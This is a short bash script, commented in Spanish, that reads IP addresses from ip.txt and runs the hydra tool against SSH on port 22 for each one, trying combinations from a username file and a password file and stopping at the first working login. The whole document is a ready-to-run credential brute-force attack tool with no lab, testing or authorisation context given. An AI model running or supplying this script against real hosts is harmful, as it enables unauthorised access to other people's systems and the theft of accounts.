#!/bin/bash
# Fuerza bruta SSH, de listado de IPs desde fichero ip.txt

for i in `cat ip.txt`
do
       echo $i
       hydra $i ssh -s 22 -L usuarios.txt -P claves.txt -f -t 3
done
    
